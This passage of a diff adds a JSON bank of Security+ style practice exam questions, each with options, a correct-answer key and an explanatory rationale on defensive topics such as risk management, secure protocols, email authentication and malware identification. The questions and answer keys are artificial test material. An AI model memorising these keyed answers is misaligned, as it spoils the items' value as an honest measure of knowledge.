+    "explanation": "ESP provides encryption, and tunnel mode wraps the whole original packet in a new header, which suits gateway-to-gateway VPNs. Transport mode protects only the payload, and AH provides integrity without encryption."
+  },
+  {
+    "id": "SECPLUS-T2-005",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 2,
+    "format": "order",
+    "skill": "Change management",
+    "stem": "A team needs to upgrade the firmware on a core switch under the company's change management process. Place the steps in the order they should occur.",
+    "options": [
+      "Submit a formal change request",
+      "Analyze impact and dependencies",
+      "Obtain change advisory board approval",
+      "Implement during the maintenance window",
+      "Verify results and update documentation"
+    ],
+    "correct": [
+      0,
+      1,
+      2,
+      3,
+      4
+    ],
+    "explanation": "The request starts the process, the impact analysis gives the CAB what it needs to decide, and only an approved change is implemented in its window. Verification and documentation come last so diagrams and baselines match what was actually changed."
+  },
+  {
+    "id": "SECPLUS-T2-006",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "NetFlow",
+    "stem": "An analyst needs to see which internal hosts talked to an external IP, how much data moved, and when, without full packet contents. Which data source is BEST?",
+    "options": [
+      "SNMP traps",
+      "Full packet captures",
+      "Application debug logs",
+      "NetFlow records"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "NetFlow records metadata about conversations: endpoints, ports, byte counts, and times. Full packet captures also include payloads, which the analyst does not need and which cost far more to store."
+  },
+  {
+    "id": "SECPLUS-T2-007",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 1,
+    "format": "multi",
+    "skill": "Mobile device risks",
+    "select": 2,
+    "stem": "A company's mobile security policy aims to keep malicious apps off employee phones. Which TWO practices bypass the phone's built-in app vetting and should be prohibited? (Choose two.)",
+    "options": [
+      "Side loading apps from websites",
+      "Jailbreaking or rooting the device",
+      "Enabling automatic OS updates",
+      "Using fingerprint unlock",
+      "Installing apps from the official store"
+    ],
+    "correct": [
+      0,
+      1
+    ],
+    "explanation": "Side loading installs apps that never passed store review, and jailbreaking or rooting removes the operating system restrictions that enforce app vetting. Automatic updates reduce risk rather than add it."
+  },
+  {
+    "id": "SECPLUS-T2-008",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 2,
+    "format": "multi",
+    "skill": "Business impact analysis",
+    "select": 2,
+    "stem": "During a business impact analysis, which TWO objectives state how much downtime and how much data loss a process can tolerate? (Choose two.)",
+    "options": [
+      "Recovery time objective",
+      "Recovery point objective",
+      "Mean time to repair",
+      "Mean time between failures",
+      "Annualized loss expectancy"
+    ],
+    "correct": [
+      0,
+      1
+    ],
+    "explanation": "The RTO sets the maximum acceptable downtime and the RPO sets the maximum acceptable data loss measured in time. MTTR is a measured average of repair time, not a tolerance the business sets."
+  },
+  {
+    "id": "SECPLUS-T2-009",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "SD-WAN",
+    "stem": "A retailer with 200 branches wants to replace costly MPLS circuits with ordinary internet links while centrally managing and prioritizing traffic paths. Which technology BEST fits?",
+    "options": [
+      "Dedicated leased lines",
+      "Clientless TLS VPN",
+      "Network access control",
+      "SD-WAN"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "SD-WAN uses software to manage multiple internet and private links centrally, choosing paths by policy. A clientless TLS VPN is tempting, but it serves individual remote users through a browser, not branch-to-branch routing."
+  },
+  {
+    "id": "SECPLUS-T2-010",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "SNMP traps",
+    "stem": "A network team wants routers to proactively notify the monitoring server the moment an interface goes down. Which mechanism does this?",
+    "options": [
+      "SNMP traps",
+      "NetFlow sampling",
+      "Port mirroring",
+      "SNMP GET polling"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "SNMP traps are unsolicited alerts that agents push to the manager when an event occurs. GET polling waits for the manager to ask, so it is not proactive."
+  },
+  {
+    "id": "SECPLUS-T2-011",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Zero-day mitigation",
+    "stem": "Threat intelligence reports active exploitation of a newly discovered browser flaw for which the vendor has not released a patch. Which control BEST reduces risk until a fix is available?",
+    "options": [
+      "Applying the vendor patch now",
+      "Host-based IPS",
+      "Full-disk encryption",
+      "Changing default credentials"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "With a zero-day there is no patch, so a host-based intrusion prevention system that detects and blocks exploit behavior is the best interim control. Applying a patch is not possible because none exists yet."
+  },
+  {
+    "id": "SECPLUS-T2-012",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Certificate types",
+    "stem": "A company hosts mail.example.com, shop.example.com and vpn.example.com and wants one certificate covering all of them and any future subdomains. Which certificate type should it request?",
+    "options": [
+      "Self-signed certificate",
+      "Code-signing certificate",
+      "Root certificate",
+      "Wildcard certificate"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "A wildcard certificate for *.example.com covers any first-level subdomain, including ones added later. A self-signed certificate is not trusted by outside browsers, so it is unsuitable for public services."
+  },
+  {
+    "id": "SECPLUS-T2-013",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Risk register",
+    "stem": "Which document records identified risks along with their risk owners, key risk indicators, thresholds, and planned responses?",
+    "options": [
+      "Statement of work",
+      "Risk register",
+      "Business impact analysis",
+      "Acceptable use policy"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "A risk register tracks each identified risk with its owner, indicators, thresholds and planned response. A business impact analysis measures the effect of disruptions on processes but is not the running list of risks."
+  },
+  {
+    "id": "SECPLUS-T2-014",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Data loss prevention",
+    "stem": "A company wants to block employees from emailing files that contain customer credit card numbers to external recipients. Which control BEST accomplishes this?",
+    "options": [
+      "Data loss prevention",
+      "File integrity monitoring",
+      "DNS filtering",
+      "Network access control"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "DLP inspects content for sensitive patterns such as card numbers and blocks unauthorized transfers. File integrity monitoring detects changes to files, not data leaving the organization."
+  },
+  {
+    "id": "SECPLUS-T2-015",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "SASE",
+    "stem": "A mostly remote organization wants cloud-delivered networking combined with secure web gateway, CASB and zero trust access in one service. Which framework BEST describes this?",
+    "options": [
+      "Software-defined networking",
+      "Secure access service edge",
+      "Unified threat management",
+      "Screened subnet architecture"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "SASE delivers SD-WAN and security services such as SWG, CASB and ZTNA from the cloud near the user. UTM is tempting, but it is an on-premises appliance bundling security functions at one network edge."
+  },
+  {
+    "id": "SECPLUS-T2-016",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Configuration enforcement",
+    "stem": "Developers repeatedly create cloud storage buckets with public read access, exposing customer files. Which mitigation BEST prevents these misconfigurations from persisting?",
+    "options": [
+      "Application allow listing",
+      "Host-based firewalls",
+      "Configuration enforcement",
+      "Decommissioning old buckets"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Configuration enforcement automatically checks and corrects settings against a secure baseline, catching public buckets as they appear. Decommissioning old buckets does nothing about new ones being misconfigured."
+  },
+  {
+    "id": "SECPLUS-T2-017",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Firewall rules",
+    "stem": "A firewall has an allow rule for HTTPS followed by a final deny-all rule. Traffic on TCP 8080 arrives that matches no explicit allow rule. What happens?",
+    "options": [
+      "It is allowed because the HTTPS rule matches first",
+      "It is forwarded to the screened subnet",
+      "It is blocked by the deny-all rule",
+      "It is logged and allowed by default"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Firewall rules are processed top-down, and traffic matching no allow rule falls to the deny-all (implicit deny). The HTTPS rule matches only port 443, not 8080."
+  },
+  {
+    "id": "SECPLUS-T2-018",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Key risk indicators",
+    "stem": "The CISO wants a metric that alerts leadership when phishing click rates rise above 5%, signaling growing exposure. What is this metric called?",
+    "options": [
+      "Recovery point objective",
+      "Key risk indicator",
+      "Key performance indicator",
+      "Risk owner"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "A key risk indicator signals rising risk before it becomes an incident. A key performance indicator measures how well a process is achieving its goals rather than warning of risk."
+  },
+  {
+    "id": "SECPLUS-T2-019",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Screened subnets",
+    "stem": "A company is deploying a public-facing web server that must be reachable from the internet while keeping the internal network protected. Where should the server be placed?",
+    "options": [
+      "On the internal server VLAN",
+      "Behind the internal database firewall",
+      "On the management network",
+      "In a screened subnet"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "A screened subnet (DMZ) sits between the internet and the internal network, so a compromised public server does not give direct access inside. Placing it on the internal VLAN would expose internal systems to internet-originated attacks."
+  },
+  {
+    "id": "SECPLUS-T2-020",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Behavior-based detection",
+    "stem": "An IPS fails to detect a new attack because no matching pattern exists in its database yet. Which detection method would MOST likely have caught it?",
+    "options": [
+      "Signature-based detection",
+      "Port-based access lists",
+      "Static allow-list filtering",
+      "Behavior-based detection"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Behavior- or anomaly-based detection flags deviations from a learned baseline, so it can catch new attacks. Signature-based detection needs a known pattern, which is exactly what was missing."
+  },
+  {
+    "id": "SECPLUS-T2-021",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Malware types",
+    "stem": "Malware spreading over SMB port 445 infected 300 hosts in an hour without any user opening a file or clicking a link. Which type of malware is MOST likely?",
+    "options": [
+      "Virus",
+      "Worm",
+      "Logic bomb",
+      "Trojan"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "A worm self-replicates across the network by exploiting services, with no user action needed. A virus needs a user to run an infected host file to spread."
+  },
+  {
+    "id": "SECPLUS-T2-022",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Encryption levels",
+    "stem": "A laptop is stolen from an employee's car. Which encryption level would BEST ensure that no data on its drive, including the operating system and swap space, can be read?",
+    "options": [
+      "File-level encryption",
+      "Full-disk encryption",
+      "Record-level encryption",
+      "Transport encryption"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Full-disk encryption protects everything on the drive, including the OS, temporary files and swap space. File-level encryption protects only the files selected, leaving other data readable."
+  },
+  {
+    "id": "SECPLUS-T2-023",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Risk appetite",
+    "stem": "Leadership at a fast-growing startup is willing to accept substantial risk to expand quickly into new markets. Which risk appetite does this describe?",
+    "options": [
+      "Conservative",
+      "Avoidant",
+      "Expansionary",
+      "Neutral"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "An expansionary risk appetite accepts higher risk in pursuit of growth and reward. A conservative appetite would favor minimizing risk even if it slows expansion."
+  },
+  {
+    "id": "SECPLUS-T2-024",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Web filtering",
+    "stem": "Remote employees often work off the corporate network, but their web browsing must still be filtered by category. Which solution BEST fits?",
+    "options": [
+      "A centralized on-premises proxy only",
+      "DNS sinkholing on the internal resolver",
+      "A port-based firewall rule on the office edge",
+      "Agent-based web filtering"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "An agent on each device enforces filtering wherever the user connects. An on-premises proxy only filters traffic that passes through the corporate network."
+  },
+  {
+    "id": "SECPLUS-T2-025",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Ransomware response",
+    "stem": "An analyst sees a laptop rapidly renaming shared-drive files with a .lock extension and dropping README_RESTORE.txt notes. Which action should the analyst take FIRST?",
+    "options": [
+      "Isolate the laptop from the network",
+      "Patch the laptop's operating system",
+      "Restore the files from backup",
+      "Change the user's password"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "Mass file renaming and ransom notes indicate ransomware, and isolating the host first stops further encryption of shared data. Restoring backups before containment lets the malware encrypt the restored files again."
+  },
+  {
+    "id": "SECPLUS-T2-026",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Data states",
+    "stem": "A security architect wants to protect sensitive records while they are being processed in a server's memory. Which data state does this address?",
+    "options": [
+      "Data at rest",
+      "Data in use",
+      "Data in transit",
+      "Archived data"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Data being processed in memory is data in use. Data at rest is stored on disk or other media, which is not where these records are while they are processed."
+  },
+  {
+    "id": "SECPLUS-T2-027",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Group Policy",
+    "stem": "A Windows administrator must enforce password complexity and disable USB storage across all domain-joined computers. Which tool should be used?",
+    "options": [
+      "Group Policy",
+      "SELinux",
+      "MDM selective wipe",
+      "A RADIUS server"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "Group Policy centrally applies security settings to Windows domain members. SELinux is a Linux mandatory access control framework and does not manage Windows hosts."
+  },
+  {
+    "id": "SECPLUS-T2-028",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Risk tolerance",
+    "stem": "Which term describes the acceptable level of variation from the organization's risk appetite for a specific risk?",
+    "options": [
+      "Inherent risk",
+      "Risk tolerance",
+      "Residual risk",
+      "Risk register entry"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Risk tolerance is how much deviation from the overall risk appetite the organization will accept for a given risk. Residual risk is the risk left after controls, not the acceptable variation."
+  },
+  {
+    "id": "SECPLUS-T2-029",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Key exchange",
+    "stem": "Two servers that have never communicated must agree on a shared symmetric session key over an untrusted network without transmitting the key itself. Which method should they use?",
+    "options": [
+      "AES-256 encryption",
+      "SHA-256 hashing",
+      "Diffie-Hellman",
+      "PBKDF2 key stretching"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Diffie-Hellman lets two parties derive the same secret key over an insecure channel without ever sending it. AES-256 is the symmetric cipher that would use the key, but it cannot securely establish the key on its own."
+  },
+  {
+    "id": "SECPLUS-T2-030",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Logic bombs",
+    "stem": "After a developer was laid off, a payroll script he wrote deleted all employee records on the first day the HR database no longer listed his ID. Which malware type is this?",
+    "options": [
+      "Worm",
+      "Rootkit",
+      "Spyware",
+      "Logic bomb"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "A logic bomb is code that lies dormant until a condition is met, here the developer's removal from the database. It does not self-propagate like a worm."
+  },
+  {
+    "id": "SECPLUS-T2-031",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 1,
+    "format": "matrix",
+    "skill": "Secure protocols",
+    "stem": "An audit finds several insecure protocols in use. For each one, select the secure alternative that should replace it.",
+    "rows": [
+      "Telnet for router management",
+      "FTP for file transfers",
+      "HTTP for the intranet portal",
+      "LDAP for directory queries"
+    ],
+    "columns": [
+      "SSH",
+      "SFTP",
+      "HTTPS",
+      "LDAPS"
+    ],
+    "correct": [
+      0,
+      1,
+      2,
+      3
+    ],
+    "explanation": "SSH replaces Telnet, SFTP replaces FTP, HTTPS replaces HTTP, and LDAPS (LDAP over TLS on port 636) replaces plain LDAP. SSH is tempting for FTP too, but the file transfer protocol built on it is SFTP."
+  },
+  {
+    "id": "SECPLUS-T2-032",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Data sovereignty",
+    "stem": "A European company learns that customer records stored in a cloud region abroad are subject to the laws of that country. Which concept does this describe?",
+    "options": [
+      "Data masking",
+      "Data classification",
+      "Data sovereignty",
+      "Data retention"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Data sovereignty means data is subject to the laws of the country where it is physically stored. Data classification is tempting, but it labels data by sensitivity and does not address which nation's laws apply."
+  },
+  {
+    "id": "SECPLUS-T2-033",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 2,
+    "format": "matrix",
+    "skill": "Risk responses",
+    "stem": "For each decision, select the risk management strategy it represents.",
+    "rows": [
+      "Buy cyber insurance for ransomware costs",
+      "Cancel a risky product launch",
+      "Approve an exception for an unpatched system",
+      "Add MFA to remote access",
+      "Stop storing customer card data"
+    ],
+    "columns": [
+      "Avoid",
+      "Transfer",
+      "Accept",
+      "Mitigate"
+    ],
+    "correct": [
+      1,
+      0,
+      2,
+      3,
+      0
+    ],
+    "explanation": "Insurance transfers financial impact, canceling the launch and no longer storing card data avoid the risk entirely, a documented exception accepts it, and MFA mitigates it. Dropping card storage looks like mitigation, but removing the activity is avoidance."
+  },
+  {
+    "id": "SECPLUS-T2-034",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Rootkits",
+    "stem": "A server's antivirus reports clean, yet a memory forensic image reveals a hidden process and a modified kernel system-call table concealing attacker files. Which malware is MOST likely present?",
+    "options": [
+      "Rootkit",
+      "Bloatware",
+      "Keylogger",
+      "Logic bomb"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "A rootkit hooks the kernel to hide processes and files from the operating system and antivirus. A keylogger records keystrokes but does not by itself alter the system-call table."
+  },
+  {
+    "id": "SECPLUS-T2-035",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "DNS filtering",
+    "stem": "A company wants to stop users from resolving known malicious domains on every device that uses its internal resolver. Which control BEST meets this?",
+    "options": [
+      "DNS filtering",
+      "DMARC enforcement",
+      "File integrity monitoring",
+      "SNMP trap forwarding"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "DNS filtering refuses or sinkholes lookups for known bad domains at the resolver. DMARC protects email domains from spoofing and does not affect name resolution."
+  },
+  {
+    "id": "SECPLUS-T2-036",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 3,
+    "format": "multi",
+    "skill": "Data obfuscation",
+    "select": 2,
+    "stem": "A payment team must protect stored card numbers, yet authorized staff need to recover the original values to process refunds. Which TWO methods allow the original data to be recovered? (Choose two.)",
+    "options": [
+      "Tokenization with a secure vault",
+      "Symmetric encryption with AES",
+      "One-way hashing with SHA-256",
+      "Truncation to the last four digits",
+      "Redaction from stored records"
+    ],
+    "correct": [
+      0,
+      1
+    ],
+    "explanation": "A token maps back to the original through the vault, and encrypted data can be decrypted with the key. Hashing is one-way by design, so the original card number cannot be recovered from it."
+  },
+  {
+    "id": "SECPLUS-T2-037",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Asymmetric algorithms",
+    "stem": "Which asymmetric algorithm provides strength comparable to RSA with much smaller keys, making it well suited to mobile and IoT devices?",
+    "options": [
+      "ECC",
+      "ChaCha20",
+      "AES",
+      "SHA-256"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "Elliptic curve cryptography is asymmetric and achieves RSA-level security with far shorter keys, saving processing power and battery. ChaCha20 also runs well on mobile hardware, but it is a symmetric stream cipher."
+  },
+  {
+    "id": "SECPLUS-T2-038",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Risk exceptions",
+    "stem": "A legacy system cannot be patched, and management formally documents approval to keep running it outside the patching policy. Which BEST describes this?",
+    "options": [
+      "Mitigation using a compensating control",
+      "Avoidance by decommissioning the system",
+      "Transference through cyber insurance",
+      "Acceptance with an exception"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Formally approving operation outside policy is risk acceptance with an exception. Decommissioning the system would be avoidance, which management chose not to do."
+  },
+  {
+    "id": "SECPLUS-T2-039",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 3,
+    "format": "multi",
+    "skill": "Email authentication",
+    "select": 3,
+    "stem": "Attackers are sending phishing emails that spoof the company's domain. Which THREE DNS-published email authentication mechanisms help receiving servers detect the spoofed messages? (Choose three.)",
+    "options": [
+      "SPF",
+      "DKIM",
+      "DMARC",
+      "DNSSEC",
+      "MX record",
+      "CNAME record"
+    ],
+    "correct": [
+      0,
+      1,
+      2
+    ],
+    "explanation": "SPF lists the servers allowed to send for the domain, DKIM signs messages, and DMARC tells receivers how to handle mail that fails those checks. DNSSEC protects the integrity of DNS answers but does not authenticate email senders."
+  },
+  {
+    "id": "SECPLUS-T2-040",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Least privilege",
+    "stem": "Malware a user launched from a phishing attachment installed a system driver because the user's everyday account had local administrator rights. Which mitigation would BEST have prevented this?",
+    "options": [
+      "Full-disk encryption",
+      "Network segmentation",
+      "Host-based firewall",
+      "Least privilege"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Running daily work with a standard account under least privilege would have blocked the driver installation. A host-based firewall filters traffic but does not stop a locally launched program from using admin rights."
+  },
+  {
+    "id": "SECPLUS-T2-041",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "File integrity monitoring",
+    "stem": "An administrator wants to be alerted whenever critical system binaries or configuration files on a web server are modified. Which tool BEST meets this need?",
+    "options": [
+      "Data loss prevention",
+      "File integrity monitoring",
+      "A web application firewall",
+      "A NetFlow analyzer"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "FIM hashes monitored files and alerts when they change unexpectedly. A WAF filters HTTP requests but does not watch files on disk."
+  },
+  {
+    "id": "SECPLUS-T2-042",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Geolocation controls",
+    "stem": "Regulations require that a company's customer database be accessible only to users located within its home country. Which control BEST enforces this requirement?",
+    "options": [
+      "Salted hashing of all stored customer records",
+      "Role-based permissions for the sales department",
+      "Geolocation-based access restrictions",
+      "Masking account numbers in printed reports"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Geographic restrictions use the user's geolocation, such as IP location, to allow or deny access by country. Role-based permissions control what a role can do but not where the user is connecting from."
+  },
+  {
+    "id": "SECPLUS-T2-043",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Vendor contracts",
+    "stem": "A company wants contractual permission to inspect a cloud vendor's security controls and records when needed. Which clause should be included?",
+    "options": [
+      "Right-to-audit clause",
+      "Force majeure clause",
+      "Indemnification clause",
+      "Non-disclosure clause"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "A right-to-audit clause gives the customer the contractual ability to examine the vendor's controls. A non-disclosure clause protects confidential information but grants no inspection rights."
+  },
+  {
+    "id": "SECPLUS-T2-044",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Application allow listing",
+    "stem": "Users keep installing a free PDF converter that secretly installs a remote access tool alongside it. Which mitigation BEST prevents unapproved executables like this from running?",
+    "options": [
+      "Application allow list",
+      "Host-based firewall rules",
+      "Full-disk encryption",
+      "Network segmentation"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "The converter is a trojan, and an application allow list lets only approved programs execute, so it never runs. Host-based firewall rules might block some callbacks but would not stop the program from installing."
+  },
+  {
+    "id": "SECPLUS-T2-045",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Key escrow",
+    "stem": "Company policy requires that a copy of each employee's private encryption key be held by a trusted third party so data can be recovered if the key is lost. What is this called?",
+    "options": [
+      "Key escrow",
+      "Key stretching",
+      "Key exchange",
+      "Certificate revocation"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "Key escrow stores copies of keys with a trusted party so encrypted data can be recovered when needed. Key stretching strengthens weak passwords or keys and has nothing to do with recovery."
+  },
+  {
+    "id": "SECPLUS-T2-046",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Network access control",
+    "stem": "A company wants to verify that devices have current antivirus and patches before they are allowed onto the wired network. Which solution should it deploy?",
+    "options": [
+      "A web content filter",
+      "A screened subnet",
+      "A SIEM correlation rule for new devices",
+      "Network access control (NAC)"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "NAC performs posture assessment and admits, quarantines, or remediates devices before granting access. A SIEM rule can alert on new devices but cannot block them from connecting."
+  },
+  {
+    "id": "SECPLUS-T2-047",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "System hardening",
+    "stem": "New laptops from a vendor arrive with trial games, toolbars, and an outdated vendor update agent that has a known vulnerability. Which hardening technique BEST addresses this?",
+    "options": [
+      "Deploying host-based intrusion prevention",
+      "Changing default passwords",
+      "Enabling disk encryption",
+      "Removing unnecessary software"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Preinstalled bloatware adds attack surface, and removing unnecessary software eliminates the vulnerable agent entirely. A host IPS may detect exploitation but leaves the vulnerable code installed."
+  },
+  {
+    "id": "SECPLUS-T2-048",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Conflict of interest",
+    "stem": "During vendor selection, a procurement manager learns that her spouse owns one of the companies bidding for the contract. What must she disclose?",
+    "options": [
+      "A breach of the SLA",
+      "A due diligence finding",
+      "A rules of engagement violation",
+      "A conflict of interest"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "A personal financial relationship with a bidder is a conflict of interest that must be disclosed. Due diligence evaluates the vendor itself, not the evaluator's personal relationships."
+  },
+  {
+    "id": "SECPLUS-T2-049",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Data types",
+    "stem": "Proprietary formulas that give a company its competitive edge, protected by keeping them confidential rather than patenting them, are BEST described as which data type?",
+    "options": [
+      "Trade secret",
+      "Regulated data",
+      "Legal information",
+      "Financial information"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "A trade secret is valuable proprietary information protected by secrecy. Regulated data is tempting, but that term covers data governed by laws such as HIPAA or PCI DSS rather than commercial secrets."
+  },
+  {
+    "id": "SECPLUS-T2-050",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "XDR",
+    "stem": "A SOC wants to correlate telemetry from endpoints, email, network, and cloud workloads in a single detection and response platform. Which solution BEST fits?",
+    "options": [
+      "EDR",
+      "HIDS",
+      "XDR",
+      "NGFW"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Extended detection and response unifies telemetry across endpoints, network, email, and cloud. EDR focuses only on endpoints."
+  },
+  {
+    "id": "SECPLUS-T2-051",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "RFID cloning",
+    "stem": "A badge reader logs an employee's ID at the data center door while that employee was at home. Days earlier, a stranger lingered close beside her in a cafe line. Which attack is MOST likely?",
+    "options": [
+      "Tailgating",
+      "Brute force of the door lock",
+      "Environmental attack",
+      "RFID cloning"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Standing close to a victim with a concealed reader can copy a proximity badge, which is RFID cloning. Tailgating would show someone following an authorized person in, not the absent employee's badge being used."
+  },
+  {
+    "id": "SECPLUS-T2-052",
+    "section": "secplus",
+    "test": 2,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
